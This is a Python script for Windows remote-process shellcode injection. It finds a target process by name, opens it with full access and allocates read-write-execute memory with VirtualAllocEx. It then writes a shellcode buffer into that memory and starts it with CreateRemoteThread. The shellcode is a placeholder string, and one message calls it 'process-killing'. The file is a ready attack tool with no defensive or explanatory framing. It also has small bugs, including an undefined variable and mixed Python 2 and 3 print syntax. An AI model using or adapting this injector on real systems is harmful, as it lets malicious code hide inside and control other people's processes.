import sys
import psutil  
import ctypes  
from ctypes import *  
  
PAGE_EXECUTE_READWRITE         = 0x00000040  
PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )  
VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )  
  
kernel32      = windll.kernel32  
pName         = sys.argv[1]
  
shellcode="""shellcode"""
print(shellcode)
code_size     = len(shellcode)  
  
TH32CS_SNAPPROCESS = 0x00000002  
class PROCESSENTRY32(ctypes.Structure):  
     _fields_ = [("dwSize", ctypes.c_ulong),  
                 ("cntUsage", ctypes.c_ulong),  
                 ("th32ProcessID", ctypes.c_ulong),  
                 ("th32DefaultHeapID", ctypes.c_ulong),  
                 ("th32ModuleID", ctypes.c_ulong),  
                 ("cntThreads", ctypes.c_ulong),  
                 ("th32ParentProcessID", ctypes.c_ulong),  
                 ("pcPriClassBase", ctypes.c_ulong),  
                 ("dwFlags", ctypes.c_ulong),  
                 ("szExeFile", ctypes.c_char * 260)]  

 
 
def getProcName(pname):
    """ get process by name
    
    return the first process if there are more than one
    """
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == pname.lower():
                return str(proc).split('=')[1].split(',')[0]  # return if found one
        except psutil.AccessDenied:
            pass
        except psutil.NoSuchProcess:
            pass
    return None
 
  
procPid = int(getProcName(pName))  
print procPid  
  
# Get a handle to the process we are injecting into.  
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, procPid )  
  
if not h_process:  
  
    print "[*] Couldn't acquire a handle to PID: %s" % pid  
    sys.exit(0)  
  
# Allocate some space for the shellcode  
arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)  
  
# Write out the shellcode  
written = c_int(0)  
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))  
  
# Now we create the remote thread and point it's entry routine  
# to be head of our shellcode  
thread_id = c_ulong(0)  
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):  
  
    print "[*] Failed to inject process-killing shellcode. Exiting."  
    sys.exit(0)  
  
print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value  
